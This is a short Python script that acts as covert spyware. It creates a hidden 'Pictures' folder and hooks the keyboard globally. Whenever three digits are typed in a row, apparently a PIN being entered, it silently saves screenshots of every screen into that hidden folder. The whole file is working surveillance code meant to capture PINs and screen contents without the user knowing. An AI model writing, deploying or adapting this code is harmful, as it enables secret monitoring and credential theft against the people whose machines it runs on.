import os
import ctypes
import keyboard
from PIL import ImageGrab

num_pressed = 0
pin = 3
order_img = 0

def get_num_pressed():
    return num_pressed

def increase_num_pressed():
    global num_pressed
    num_pressed += 1

def reset_num_pressed():
    global num_pressed
    num_pressed = 0

def get_order_img():
    return order_img

def increase_order_img():
    global order_img
    order_img += 1

def get_pin():
    return pin

def hideFolder():
    # Create a folder and hide it
    try:
        rootpath = "Pictures"
        os.mkdir(rootpath)
    except OSError as e:
        print(e)  # So you'll know what the error is

    ctypes.windll.kernel32.SetFileAttributesW(rootpath, 2)  # Hide folder
    return 0

def waitPinDigit():
    keyboard.on_press(onPinDigit)
    while True:  # making a loop
            pass

def onPinDigit(event):
    if event.name.isnumeric():  #check if the key pressed is a number
        increase_num_pressed()
        if get_num_pressed() == get_pin():
            screenshot()
            print('You Pressed A Pin!')
            reset_num_pressed()
    else:
        reset_num_pressed()
    return 0

def screenshot():
    filepath = 'Pictures\screenshot-'+str(get_order_img())+'.png'
    screenshot = ImageGrab.grab(all_screens=True)  # Take the screenshot to all the screens used
    screenshot.save(filepath, 'PNG')  # Equivalent to `screenshot.save(filepath, format='PNG')`
    increase_order_img()
    return 0

if __name__ == '__main__':
    hideFolder()
    waitPinDigit()
